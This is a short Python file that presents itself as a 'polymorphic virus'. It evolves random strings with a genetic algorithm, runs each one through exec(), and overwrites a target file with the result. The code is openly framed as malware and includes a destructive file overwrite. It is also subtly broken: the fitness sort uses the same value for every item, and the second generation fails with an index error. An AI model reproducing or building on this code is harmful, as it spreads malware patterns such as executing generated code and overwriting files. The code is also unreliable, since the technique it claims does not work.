import random
import string
import os

class PolymorphicVirus:
    def __init__(self, code):
        self.code = code
        self.population_size = 100
        self.mutation_rate = 0.01
        self.generations = 100

    def generate_random_code(self):
        return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(100))

    def mutate(self, code):
        mutated_code = list(code)
        for i in range(len(code)):
            if random.random() < self.mutation_rate:
                mutated_code[i] = random.choice(string.ascii_letters + string.digits)
        return ''.join(mutated_code)

    def crossover(self, code1, code2):
        crossover_point = random.randint(0, len(code1) - 1)
        return code1[:crossover_point] + code2[crossover_point:]

    def evolve(self):
        population = [self.generate_random_code() for _ in range(self.population_size)]
        for generation in range(self.generations):
            fitness = []
            for code in population:
                # Simulate execution of code
                try:
                    exec(code)
                    fitness.append(1)
                except Exception:
                    fitness.append(0)
            population = sorted(population, key=lambda x: fitness[-1], reverse=True)
            offspring = []
            for i in range(self.population_size // 2):
                parent1 = population[i]
                parent2 = population[self.population_size - i - 1]
                child = self.crossover(parent1, parent2)
                child = self.mutate(child)
                offspring.append(child)
            population = offspring
        return population[0]

    def infect(self, filename):
        with open(filename, 'w') as f:
            f.write(self.evolve())

# Usage
virus = PolymorphicVirus('print("Hello, World!")')
virus.infect('example.txt')
